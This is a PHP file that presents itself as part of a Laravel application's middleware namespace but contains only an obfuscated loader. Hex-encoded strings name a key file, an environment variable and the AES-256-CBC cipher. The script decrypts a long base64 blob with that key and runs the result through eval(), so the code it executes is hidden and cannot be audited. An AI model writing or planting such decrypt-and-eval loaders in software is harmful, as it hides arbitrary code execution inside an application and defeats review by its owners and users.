<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Ak5Nvo//eWnuhN3ZsUkluQ==');

$c=base64_decode(

'EthWnu4iouOXkXFTkOcsxx+5ItYaQFWTBSRHmPNCAuwbnweuljs3njfSI1NGtECvx+3juAEXqsjx' .
'KR3Lk2v8VYE2w+a06Jn/pzNYHR+BYiCyewUf/1U76cqThnvsnU+F8vbMvCkCgsdN1ufL1H5nLxl/' .
'iRmXYDWoy3Th6hlM6Qc32h70sOGhEqaJJujTF93AeDtngEUtdb1lRLH59JPBeyMRclAIsRXcWfsW' .
'NCW+VgmNpi/jazjeyur4D8LwAJvns2JhS/X0GlrVtU6D9LbAf/WmmEK8gWwkpS2AzhEGzu6cx87g' .
'I5E5iVbM2pKaQsvEdBZW48u/n5yujF/ukrneMXstMC7BF1FzqOldziF677T+dxtk96KpqxnyQfbk' .
'K3gn3GZoNsw6nxfala5uPFv9V6RcrzrrWaJTTyduddowhId9NSYuIwO2emeiqbwYIQHQm8p49rrL' .
'm2KdC7ZUjXwsg321xSoO+KvpPEdMOepOxVjYTAXaqQKMA2QLkOjnkJFFZ5kihAy7VUMxpLyrEM+l' .
'HHRvRAU17dotr0aORxxdpkX6KYSFVHJFmhQqCP8AR714WJgNKedPiEJeb4PHvNLcSGXn7m0wGWpi' .
'KhRgJdqqFQuBovSGwOv4QwagTaPyiDCqHT7Wp9Woc7R1V4Z9BeMtLRQZghAQwwtSSfgXvusnmakZ' .
'FDPsX53XxQqBBO1NJskl+fLOojayhGU8JtEvSHCQmz55by4tJRqbb3JmmzZp0yiJX75hKiCTK2nJ' .
'bF3MJu3DGCMJO4aoVbqnRMqpDfKWtUUtbjMik8ig5DnvEw3PDGlcoFMJsQGI2K1vr7DquPNee8FD' .
'MIhDVM6JQk4N6WYWnHQS1oYMm9AfBmp+6iWWmSikrQr+s+EpoMZkGlQevIpwa3rniiPPGt+9NKnh' .
'H+tZbRQ5P6ONy1tRpaNoczHULwARzcIpMwKP7tBKFYzgsOax1Hv4ES4fm1fwVIlCvq0JbCFqdQLt' .
'gg7xI+Jc45w2plnsGdZzjavYHmHDFccNz19xQaRhik78H1gRK2WtMxYLESdxQnbDORfOVBWFc5zx' .
'M6LcoOPJj5yhz9jbuG+adzjIEm++RgIMqm4IR74DFKBpbNWsH3CX+vUONJhM68cuoRZlJ9+XV7iR' .
'dbt9NctDEF372478hvtayFgm7/iTsjqHCcoKppIEw6RivUg1rpd6/1ojuvixL0hlUtWcl3S8l0u9' .
'SaU2CfBj/3DCXBrwxwdeP8l4rXtV01CtMr3igdEsOAZIOrDnA8vOLHQpmhzYta3SfmMmKfPDHz02' .
'QmSh1r3vCkqU/wBq9CUxufNvakQkdBRqWjlPUtTLTy0YGQRJ1jm1ABmSr2q+B1qJoSKO1xnx8F5R' .
'cFxqLJwRFQqLsJaF/dlJs6WqdISvjzLWMP838IFLFj70OFWIjm9DCzW9d16cl9iZNnicUE3QKhoR' .
'4yVHqM8iyuTHCU2axHlIhH8pJL+2mSuPkNLqnUyilgrXkFPC65l97uArQ91rDL7tHp921o3Lsaes' .
'PALkIxoE6HRyZhmw7SKZPAqe55yl9kB/OiwW1g=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

